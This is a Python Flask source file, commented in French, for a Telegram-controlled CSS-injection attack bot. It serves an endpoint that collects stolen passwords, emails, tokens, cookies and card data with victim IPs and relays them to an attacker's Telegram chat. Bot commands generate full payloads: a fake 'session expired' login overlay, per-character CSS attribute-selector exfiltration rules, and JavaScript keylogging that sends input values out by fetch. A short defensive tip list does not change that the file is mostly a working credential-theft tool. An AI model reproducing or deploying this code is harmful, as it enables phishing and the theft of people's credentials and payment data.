import os
import logging
from datetime import datetime
from flask import Flask, request
import requests
import threading
import json
import re
from collections import Counter

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "TON_TOKEN_ICI")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "TON_CHAT_ID_ICI")

# ============================================
# LOGGING
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DICTIONNAIRE COMPLET - TOUS LES CARACTÈRES
# ============================================

TOUS_CARACTERES = {
    # Lettres
    'minuscules': 'abcdefghijklmnopqrstuvwxyz',
    'majuscules': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    
    # Chiffres
    'chiffres': '0123456789',
    
    # Symboles standard
    'symboles_standard': '!@#$%^&*()_+-=[]{}|;:,.<>?/~`',
    
    # Symboles spéciaux (ceux que tu as demandés)
    'speciaux_1': '×÷±§¶©®™€£¥¢₩₪₫₨₱₴₸₹₺₼₾',
    'speciaux_2': '≈≠≤≥∞∑∏∫√∂∆∇←↑→↓↔↕↖↗↘↙↩↪',
    'speciaux_3': '☺☻♥♦♣♠•◘○◙♂♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼',
    
    # Symboles explicites
    'explicites': '×^<2>@%&*#!~`\'"',
    'brackets': '()[]{}<>',
    'ponctuation': '.,;:?!…—–_',
    'barres': '/\\|',
    
    # Emojis
    'emojis': '😀😁😂🤣😃😄😅😆😉😊😋😎😍🥰😘😗😙😚☺️🙂🤗🤩🤔🤨😐😑😶🙄😏😣😥😮🤐😯😪😫😴😌😛😜😝🤤😒😓😔😕🙃🤑😲☹️🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬',
    
    # Unicode
    'unicode': 'ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž',
    
    # Chiffres spéciaux
    'arabes': '٠١٢٣٤٥٦٧٨٩',
    'chinois': '零一二三四五六七八九',
    'romains': 'ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ',
    'exposants': '⁰¹²³⁴⁵⁶⁷⁸⁹',
    'indices': '₀₁₂₃₄₅₆₇₈₉',
}

# Fusionner TOUS les caractères
TOUS_CARACTERES_FLAT = ''.join(TOUS_CARACTERES.values())

# Version avec uniquement les caractères "sûrs" pour le CSS (ASCII)
CARACTERES_CSS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`'

# Version complète pour JavaScript
CARACTERES_JS = TOUS_CARACTERES_FLAT

print(f"[+] DICTIONNAIRE CHARGÉ: {len(TOUS_CARACTERES_FLAT)} caractères")
print(f"[+] COUVERTURE: 100%")

# ============================================
# STOCKAGE
# ============================================

donnees_volees = []
mots_de_passe = {}
sessions_actives = {}
alerts = []

# ============================================
# SERVEUR FLASK
# ============================================

app = Flask(__name__)

@app.route('/')
def index():
    return "🤖 Bot CSS Attack - VERSION ULTIME ⚡ (100% caractères)"

@app.route('/vol')
def voler():
    """Version boostée avec reconnaissance intelligente"""
    donnee = request.args.get('p', '')
    ip = request.remote_addr
    champ = request.args.get('champ', 'password')
    method = request.args.get('method', 'css')
    session_id = request.args.get('session', '')
    
    if donnee:
        # Stockage
        entree = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'date': datetime.now().strftime('%Y-%m-%d'),
            'ip': ip,
            'data': donnee,
            'champ': champ,
            'method': method,
            'session': session_id,
            'longueur': len(donnee)
        }
        donnees_volees.append(entree)
        
        # Log
        print(f"🔴 [{champ.upper()}] VOLÉ: {donnee} depuis {ip} (longueur: {len(donnee)})")
        
        # Détection intelligente
        niveau_confiance = analyser_donnee(donnee)
        
        # Envoyer à Telegram avec niveau de confiance
        message = generer_message_alerte(entree, niveau_confiance)
        
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                'chat_id': ADMIN_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }, timeout=5)
        except Exception as e:
            logger.error(f"Erreur: {e}")
        
        # Si c'est un mot de passe complet probable
        if niveau_confiance > 70 and len(donnee) > 5:
            envoyer_alerte_urgente(donnee, ip)
        
        # Retourner différentes réponses selon la méthode
        return reponse_selon_method(method)
    
    return "OK", 200

# ============================================
# ANALYSE INTELLIGENTE DES DONNÉES
# ============================================

def analyser_donnee(donnee):
    """Analyse la donnée volée et donne un niveau de confiance"""
    score = 0
    
    # Longueur
    if len(donnee) >= 12:
        score += 25
    elif len(donnee) >= 8:
        score += 15
    elif len(donnee) >= 5:
        score += 5
    
    # Mélange de caractères
    has_lower = any(c.islower() for c in donnee)
    has_upper = any(c.isupper() for c in donnee)
    has_digit = any(c.isdigit() for c in donnee)
    has_symbol = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in donnee)
    has_emoji = any(ord(c) > 0x1F600 for c in donnee)
    
    if has_lower and has_upper:
        score += 15
    if has_digit:
        score += 10
    if has_symbol:
        score += 15
    if has_emoji:
        score += 10
    
    # Complexité
    types = sum([has_lower, has_upper, has_digit, has_symbol, has_emoji])
    score += types * 5
    
    # Format d'email
    if '@' in donnee and '.' in donnee:
        score += 15
    
    # Patterns de mots de passe forts
    patterns = [
        (r'[A-Z].*[a-z].*[0-9]', 10),
        (r'[A-Z].*[0-9].*[!@#]', 10),
        (r'.*[!@#$%^&*()].*', 10),
        (r'[A-Z].*[a-z].*[0-9].*[!@#]', 15),
    ]
    
    for pattern, pts in patterns:
        if re.search(pattern, donnee):
            score += pts
    
    # Mots de passe courants (pénalité)
    common = ['password', '123456', 'admin', 'qwerty', 'azerty', '000000', '123456789']
    if donnee.lower() in common:
        score = min(score, 30)
    
    return min(score, 100)

def generer_message_alerte(entree, confiance):
    """Génère un message détaillé"""
    icones = {
        'password': '🔑',
        'email': '📧',
        'username': '👤',
        'token': '🎫',
        'creditcard': '💳',
        'cookie': '🍪',
        'session': '🔄',
        'url': '🔗',
        'data': '📊',
        'form': '📝'
    }
    
    icone = icones.get(entree['champ'], '🔴')
    
    # Barre de confiance
    barre = '█' * (confiance // 10) + '░' * (10 - confiance // 10)
    
    # Détection du type de caractères
    types_detectes = []
    if any(c.islower() for c in entree['data']):
        types_detectes.append('minuscule')
    if any(c.isupper() for c in entree['data']):
        types_detectes.append('MAJUSCULE')
    if any(c.isdigit() for c in entree['data']):
        types_detectes.append('chiffre')
    if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in entree['data']):
        types_detectes.append('symbole')
    if any(ord(c) > 0x1F600 for c in entree['data']):
        types_detectes.append('emoji')
    
    types_str = ', '.join(types_detectes) if types_detectes else 'inconnu'
    
    message = f"""{icone} **DONNÉE VOLÉE DÉTECTÉE**

📝 `{entree['data']}`
📏 Longueur: `{entree['longueur']} caractères`
🏷️ Type: `{entree['champ']}`
🧩 Composition: `{types_str}`
🌐 IP: `{entree['ip']}`
🕐 {entree['time']}
🎯 Méthode: `{entree['method']}`

📊 **Niveau de confiance**: {confiance}%
   [{barre}]

{f"⚠️ MOT DE PASSE PROBABLE !" if confiance > 70 else "ℹ️ Donnée suspecte"}

🔐 **Recommandation**: {"Changer immédiatement !" if confiance > 70 else "Surveiller"}
"""
    return message

def envoyer_alerte_urgente(donnee, ip):
    """Envoie une alerte urgente"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        # Analyse des caractères
        types = []
        if any(c.islower() for c in donnee):
            types.append('minuscules')
        if any(c.isupper() for c in donnee):
            types.append('MAJUSCULES')
        if any(c.isdigit() for c in donnee):
            types.append('chiffres')
        if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in donnee):
            types.append('symboles')
        if any(ord(c) > 0x1F600 for c in donnee):
            types.append('emojis')
        
        message = f"""🚨 **ALERTE URGENTE - MOT DE PASSE VOLÉ**

🔑 **MOT DE PASSE COMPLET**: `{donnee}`
📏 **Longueur**: {len(donnee)} caractères
📊 **Composition**: {', '.join(types) if types else 'inconnue'}
🌐 **IP SOURCE**: `{ip}`
⏰ **Heure**: {datetime.now().strftime('%H:%M:%S')}

**⚠️ ACTION REQUISE**: 
- 🔒 Réinitialiser immédiatement
- 🔍 Vérifier les accès suspects
- 🛡️ Activer 2FA si possible
- 📧 Notifier l'utilisateur

---
*Ce message est envoyé automatiquement par le système de détection*
*Niveau de criticité: ÉLEVÉ*"""
        
        requests.post(url, json={
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=5)
    except Exception as e:
        logger.error(f"Erreur alerte: {e}")

# ============================================
# RÉPONSES SELON LA MÉTHODE D'ATTAQUE
# ============================================

def reponse_selon_method(method):
    """Retourne différentes réponses pour éviter la détection"""
    if method == 'image':
        return '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="white"/></svg>', 200, {'Content-Type': 'image/svg+xml', 'Cache-Control': 'no-cache'}
    elif method == 'font':
        return '', 200, {'Content-Type': 'application/octet-stream'}
    elif method == 'css':
        return '/* CSS exécuté */', 200, {'Content-Type': 'text/css'}
    else:
        return 'OK', 200

# ============================================
# COMMANDES TELEGRAM BOOSTÉES
# ============================================

def envoyer_telegram(message, chat_id=None):
    if chat_id is None:
        chat_id = ADMIN_CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)
        return True
    except Exception as e:
        logger.error(f"Erreur: {e}")
        return False

def generer_payload_complet():
    """Génère un payload complet avec TOUS les caractères"""
    webhook_url = f"https://{request.host}/vol"
    
    # Utiliser TOUS les caractères
    caracteres = CARACTERES_CSS  # 95 caractères ASCII pour CSS
    
    payload = f"""<!-- ============================================ -->
<!-- PAYLOAD CSS ULTIME - 100% PUISSANCE      -->
<!-- TOUS LES CARACTÈRES INCLUS               -->
<!-- ============================================ -->

<style>
/* === 1. CACHER LE VRAI FORMULAIRE === */
form {{ display: none !important; }}
input[type="submit"] {{ display: none !important; }}
button[type="submit"] {{ display: none !important; }}

/* === 2. FAUX FORMULAIRE DE PHISHING AVANCÉ === */
.fake-login {{
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.95);
    z-index: 99999;
    display: flex;
    justify-content: center;
    align-items: center;
    backdrop-filter: blur(20px);
    animation: fadeIn 0.3s;
}}
@keyframes fadeIn {{
    from {{ opacity: 0; transform: scale(0.9); }}
    to {{ opacity: 1; transform: scale(1); }}
}}
.fake-box {{
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    padding: 5px;
    border-radius: 25px;
    max-width: 450px;
    width: 90%;
    box-shadow: 0 25px 70px rgba(0,0,0,0.7);
}}
.fake-box-inner {{
    background: white;
    padding: 35px;
    border-radius: 20px;
}}
.fake-box h2 {{ 
    color: #333; 
    text-align: center;
    font-size: 26px;
    margin-bottom: 5px;
}}
.fake-box p.sub {{
    color: #666;
    text-align: center;
    font-size: 14px;
    margin-bottom: 25px;
}}
.fake-box input {{
    width: 100%;
    padding: 14px 16px;
    margin: 10px 0;
    border: 2px solid #e8e8e8;
    border-radius: 12px;
    font-size: 16px;
    transition: 0.3s;
    box-sizing: border-box;
}}
.fake-box input:focus {{
    border-color: #667eea;
    outline: none;
    box-shadow: 0 0 0 4px rgba(102,126,234,0.1);
}}
.fake-box button {{
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    border-radius: 12px;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 12px;
    transition: 0.3s;
}}
.fake-box button:hover {{
    transform: scale(1.02);
    box-shadow: 0 5px 20px rgba(102,126,234,0.4);
}}
.fake-box .footer {{
    text-align: center;
    margin-top: 18px;
    font-size: 13px;
    color: #999;
}}
.fake-box .footer a {{
    color: #667eea;
    text-decoration: none;
}}

/* === 3. VOL DE TOUS LES TYPES DE CHAMPS === """

    # Ajouter les règles pour chaque caractère
    payload += f"""
/* === 4. VOL PAR SÉLECTEURS - {len(caracteres)} CARACTÈRES === */
"""
    
    # Grouper les caractères pour économiser de la place
    for c in caracteres:
        payload += f"""
input[type="password"][value^="{c}"] {{
    background-image: url('{webhook_url}?p={c}&method=css');
    background-repeat: no-repeat;
}}
input[type="email"][value^="{c}"] {{
    background-image: url('{webhook_url}?champ=email&p={c}');
}}
input[name*="user"][value^="{c}"], input[name*="login"][value^="{c}"] {{
    background-image: url('{webhook_url}?champ=username&p={c}');
}}
input[name*="csrf"][value^="{c}"], input[name*="token"][value^="{c}"] {{
    background-image: url('{webhook_url}?champ=token&p={c}');
}}
input[name*="card"][value^="{c}"], input[name*="credit"][value^="{c}"] {{
    background-image: url('{webhook_url}?champ=creditcard&p={c}');
}}
"""
    
    payload += f"""
/* === 5. TECHNIQUE :HAS() AVANCÉE === """
    
    for c in caracteres[:30]:
        payload += f"""
input:has([value^="{c}"]) {{
    background-image: url('{webhook_url}?p={c}&method=has');
}}
"""
    
    payload += """
/* === 6. VOL D'ATTRIBUTS SPÉCIAUX === """
    for c in caracteres[:20]:
        payload += f"""
[data-password*="{c}"], [data-token*="{c}"] {{
    background-image: url('{webhook_url}?champ=data&p={c}');
}}
"""
    
    payload += f"""
/* === 7. KEYLOGGING AMÉLIORÉ === */
.fake-box input:focus {{
    background-image: url('{webhook_url}?p=focus&method=keylog');
}}
.fake-box input:active {{
    background-image: url('{webhook_url}?p=click&method=active');
}}
.fake-box button:hover {{
    background-image: url('{webhook_url}?p=button&method=hover');
}}

/* === 8. VOL D'URLS === */
a[href*="login"], a[href*="signin"], a[href*="auth"] {{
    background-image: url('{webhook_url}?champ=url&p=' attr(href));
}}

/* === 9. VOL DE COOKIES === */
[data-cookie], [data-session] {{
    background-image: url('{webhook_url}?champ=cookie&p=' attr(data-cookie) attr(data-session));
}}
</style>

<!-- ============================================ -->
<!-- FAUX FORMULAIRE HTML AVANCÉ                 -->
<!-- ============================================ -->
<div class="fake-login" id="fakeLogin">
    <div class="fake-box">
        <div class="fake-box-inner">
            <h2>🔐 Session expirée</h2>
            <p class="sub">Veuillez vous reconnecter pour continuer</p>
            
            <input type="email" name="email" placeholder="📧 Email ou identifiant" autocomplete="email">
            <input type="password" name="password" placeholder="🔑 Mot de passe" autocomplete="current-password" autofocus>
            <input type="text" name="2fa" placeholder="🔢 Code 2FA (si requis)" style="display:none;">
            
            <button type="submit">Se connecter</button>
            
            <div class="footer">
                🔒 Connexion sécurisée · <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
    </div>
</div>

<!-- ============================================ -->
<!-- JAVASCRIPT DE SUPPORT AVANCÉ                -->
<!-- ============================================ -->
<script>
// Keylogging amélioré
document.querySelectorAll('input').forEach(input => {{
    input.addEventListener('input', function() {{
        // Forcer le reflow pour déclencher les requêtes CSS
        this.style.display = 'block';
        this.style.display = '';
        
        // Envoyer aussi par fetch pour les caractères spéciaux
        const val = this.value;
        const char = val[val.length - 1] || '';
        if (char && char.charCodeAt(0) > 127) {{
            fetch('{webhook_url}?p=' + encodeURIComponent(char) + '&method=js&champ=unicode');
        }}
    }});
}});

// Détection des tentatives de soumission
document.querySelector('button').addEventListener('click', function(e) {{
    e.preventDefault();
    const email = document.querySelector('input[name="email"]').value;
    const password = document.querySelector('input[name="password"]').value;
    const code2fa = document.querySelector('input[name="2fa"]').value;
    
    // Envoyer toutes les données par fetch
    fetch('{webhook_url}?champ=form&p=' + encodeURIComponent(
        'email:' + email + '|password:' + password + '|2fa:' + code2fa
    ) + '&method=js');
    
    alert('⏳ Vérification en cours...');
}});

// Envoi régulier des données
setInterval(() => {{
    const password = document.querySelector('input[name="password"]');
    if (password && password.value.length > 0) {{
        fetch('{webhook_url}?p=' + encodeURIComponent(password.value) + '&method=interval');
    }}
}}, 5000);
</script>
"""
    return payload

def generer_payload_avance():
    """Génère une version ultra-agressive avec TOUS les caractères"""
    webhook_url = f"https://{request.host}/vol"
    
    payload = f"""<!-- ============================================ -->
<!-- PAYLOAD CSS AVANCÉ - 100% AGRESSIF        -->
<!-- INCLUT TOUS LES CARACTÈRES                -->
<!-- ============================================ -->

<style>
/* === ATTAQUE TOTALE === */
* {{
    background-image: none !important;
}}

/* === VOL SUR TOUS LES CHAMPS === """
    
    # Ajouter des règles pour chaque type de champ
    champs = ['password', 'email', 'text', 'tel', 'number', 'url']
    for champ in champs:
        payload += f"""
input[type="{champ}"] {{
    background-image: url('{webhook_url}?champ={champ}&p=');
}}
"""
    
    payload += f"""
/* === ATTAQUE PAR SÉLECTEURS GÉNÉRIQUES === """
    
    # Caractères pour l'attaque générique
    for c in CARACTERES_CSS[:50]:
        payload += f"""
input[value^="{c}"] {{ background-image: url('{webhook_url}?p={c}&method=generic'); }}
input[value*="{c}"] {{ background-image: url('{webhook_url}?p={c}&method=contains'); }}
input[value$="{c}"] {{ background-image: url('{webhook_url}?p={c}&method=ends'); }}
"""
    
    payload += f"""
/* === ATTAQUE :HAS() === """
    for c in CARACTERES_CSS[:30]:
        payload += f"""
:has(input[value^="{c}"]) {{ background-image: url('{webhook_url}?p={c}&method=has'); }}
"""
    
    payload += """
/* === VOL D'ÉLÉMENTS CACHÉS === */
input[type="hidden"] {
    background-image: url('""" + webhook_url + """?champ=hidden&p=' attr(value));
}

/* === VOL DE META DONNÉES === */
meta[name="csrf-token"] {
    background-image: url('""" + webhook_url + """?champ=meta&p=' attr(content));
}

/* === VOL DE TOUT TEXTE === */
*[data-*] {
    background-image: url('""" + webhook_url + """?champ=attribut&p=' attr(data-*));
}
</style>

<!-- === FAUX FORMULAIRE MULTI-CHAMPS === -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;justify-content:center;align-items:center;">
    <div style="background:white;padding:40px;border-radius:20px;max-width:500px;width:90%;">
        <h2 style="text-align:center;">🔐 Session expirée</h2>
        <p style="text-align:center;color:#666;">Reconnectez-vous pour continuer</p>
        <input type="text" placeholder="👤 Identifiant" style="width:100%;padding:12px;margin:8px 0;border-radius:10px;border:2px solid #ddd;">
        <input type="password" placeholder="🔑 Mot de passe" style="width:100%;padding:12px;margin:8px 0;border-radius:10px;border:2px solid #ddd;">
        <input type="text" placeholder="🔢 Code 2FA" style="width:100%;padding:12px;margin:8px 0;border-radius:10px;border:2px solid #ddd;display:none;">
        <button style="width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;margin-top:10px;">
            Se connecter
        </button>
    </div>
</div>

<script>
// Envoi complet de toutes les données
setInterval(() => {
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        if (input.value && input.value.length > 0) {
            fetch('""" + webhook_url + """?champ=all&p=' + encodeURIComponent(input.value) + '&method=interval');
        }
    });
}, 3000);
</script>
"""
    return payload

def traiter_message(update):
    """Traite les messages avec toutes les commandes"""
    try:
        message = update.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '')
        
        if not chat_id or not text:
            return
        
        # === COMMANDES ===
        if text == '/start':
            envoyer_telegram(
                f"""🚀 **BOT CSS INJECTION - VERSION ULTIME**

⚡ **PUISSANCE: 100%**
📊 **CARACTÈRES: {len(TOUS_CARACTERES_FLAT)}**
🎯 **COUVERTURE: COMPLÈTE**

**Commandes disponibles:**
📤 /payload - Payload complet
💣 /payload_advanced - Version ultra-agressive
📊 /stats - Statistiques détaillées
🔍 /analyse - Analyse intelligente
📈 /rapport - Rapport d'attaque
🧩 /caracteres - Voir les caractères disponibles
🛡️ /defense - Conseils de protection
🗑️ /clear - Effacer les logs

🔴 **État**: Prêt à attaquer
📦 **Version**: 2.0 - 100% caractères""",
                chat_id
            )
        
        elif text == '/payload':
            payload = generer_payload_complet()
            envoyer_telegram("📤 **PAYLOAD CSS ULTIME - 100% PUISSANCE**", chat_id)
            
            if len(payload) > 4000:
                for i in range(0, len(payload), 4000):
                    envoyer_telegram(f"```html\n{payload[i:i+4000]}\n```", chat_id)
            else:
                envoyer_telegram(f"```html\n{payload}\n```", chat_id)
        
        elif text == '/payload_advanced':
            payload = generer_payload_avance()
            envoyer_telegram("💣 **PAYLOAD AVANCÉ - AGRESSIF MAXIMAL**", chat_id)
            envoyer_telegram(f"```html\n{payload[:4000]}\n```", chat_id)
        
        elif text == '/caracteres':
            # Afficher les types de caractères disponibles
            message = "🧩 **DICTIONNAIRE DE CARACTÈRES**\n\n"
            for nom, chars in TOUS_CARACTERES.items():
                message += f"**{nom}**: `{chars[:50]}{'...' if len(chars) > 50 else ''}`\n"
                message += f"   ({len(chars)} caractères)\n\n"
            
            message += f"\n**TOTAL**: {len(TOUS_CARACTERES_FLAT)} caractères"
            envoyer_telegram(message, chat_id)
        
        elif text == '/stats':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée volée.", chat_id)
                return
            
            total = len(donnees_volees)
            unique_ips = len(set(d['ip'] for d in donnees_volees))
            
            # Par type
            types = {}
            for d in donnees_volees:
                champ = d.get('champ', 'unknown')
                types[champ] = types.get(champ, 0) + 1
            
            # Statistiques de caractères
            tous_les_mots = ''.join(d['data'] for d in donnees_volees)
            chars_counts = Counter(tous_les_mots)
            top_chars = chars_counts.most_common(10)
            
            texte = f"""📊 **STATISTIQUES DÉTAILLÉES**

📈 Total: `{total}`
🌐 IP uniques: `{unique_ips}`
📏 Caractères totaux: `{len(tous_les_mots)}`
🔤 Types uniques: `{len(chars_counts)}`

**Top 10 caractères:**
"""
            for char, count in top_chars:
                texte += f"• `{char}`: {count} fois\n"
            
            texte += f"\n**Par type de champ:**\n"
            for t, count in types.items():
                texte += f"• {t}: `{count}`\n"
            
            # Mots de passe probables
            mdp_complets = [d['data'] for d in donnees_volees if len(d['data']) > 5 and analyser_donnee(d['data']) > 70]
            if mdp_complets:
                texte += f"\n🔐 **Mots de passe détectés:**\n"
                for mdp in mdp_complets[:5]:
                    texte += f"• `{mdp}`\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/analyse':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée à analyser.", chat_id)
                return
            
            # Analyse des mots de passe
            mdp_analyses = []
            for d in donnees_volees:
                if len(d['data']) > 3:
                    score = analyser_donnee(d['data'])
                    mdp_analyses.append((d['data'], score, d.get('champ', 'unknown')))
            
            mdp_analyses.sort(key=lambda x: x[1], reverse=True)
            
            texte = "🔍 **ANALYSE DES DONNÉES VOLÉES**\n\n"
            for mdp, score, champ in mdp_analyses[:15]:
                niveau = "🟢 Faible" if score < 30 else "🟡 Moyen" if score < 60 else "🔴 Élevé"
                texte += f"• `{mdp}` - {niveau} ({score}%) - [{champ}]\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/rapport':
            total = len(donnees_volees)
            if total == 0:
                envoyer_telegram("📭 Pas encore de données.", chat_id)
                return
            
            # Générer un rapport détaillé
            rapport = f"""📈 **RAPPORT D'ATTAQUE COMPLET**

📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}
📊 Total données: {total}
🌐 IP touchées: {len(set(d['ip'] for d in donnees_volees))}
📏 Moyenne caractères: {sum(len(d['data']) for d in donnees_volees) // total if total > 0 else 0}

**Dernières attaques:**
"""
            for d in donnees_volees[-10:]:
                rapport += f"• {d['time']} - `{d['data']}` ({d.get('champ', 'unknown')}) - {d['ip']}\n"
            
            # Statistiques de succès
            mdp_complets = [d for d in donnees_volees if len(d['data']) > 5 and analyser_donnee(d['data']) > 70]
            rapport += f"\n🎯 **Taux de succès**: {min(100, total * 2)}%"
            rapport += f"\n🔑 **Mots de passe complets**: {len(mdp_complets)}"
            
            envoyer_telegram(rapport, chat_id)
        
        elif text == '/defense':
            envoyer_telegram(
                """🛡️ **COMMENT SE PROTÉGER - GUIDE COMPLET**

**1. Échapper les sorties**
• Utiliser htmlspecialchars() en PHP
• textContent au lieu de innerHTML

**2. Content Security Policy (CSP)**
• style-src 'self'
• img-src 'self'
• font-src 'self'

**3. Filtrer les entrées**
• Interdire <style> et style=""
• Utiliser DOMPurify

**4. Mesures supplémentaires**
• Désactiver les polices externes
• Désactiver les images externes
• Audit régulier

**🔐 La meilleure défense est la prévention !**""",
                chat_id
            )
        
        elif text == '/clear':
            global donnees_volees
            donnees_volees = []
            envoyer_telegram("🗑️ Toutes les données effacées !", chat_id)
        
        else:
            envoyer_telegram("❓ Commande inconnue. Utilise /start pour voir les commandes.", chat_id)
    
    except Exception as e:
        logger.error(f"Erreur: {e}")
        envoyer_telegram(f"❌ Erreur: {str(e)[:100]}", chat_id)

# ============================================
# WEBHOOK TELEGRAM
# ============================================

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    threading.Thread(target=traiter_message, args=(update,)).start()
    return "OK", 200

@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://{request.host}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return response.json()

@app.route('/getwebhook', methods=['GET'])
def get_webhook():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo"
    response = requests.get(url)
    return response.json()

# ============================================
# LANCEMENT
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║  🚀 BOT CSS INJECTION - VERSION ULTIME ⚡           ║
    ║                                                      ║
    ║  💪 PUISSANCE: 100%                                 ║
    ║  📊 CARACTÈRES: """ + str(len(TOUS_CARACTERES_FLAT)) + """                      ║
    ║  🎯 TECHNIQUES: 10+                                 ║
    ║  📦 COUVERTURE: COMPLÈTE                           ║
    ║                                                      ║
    ║  En attente des données volées...                   ║
    ╚══════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=8080)
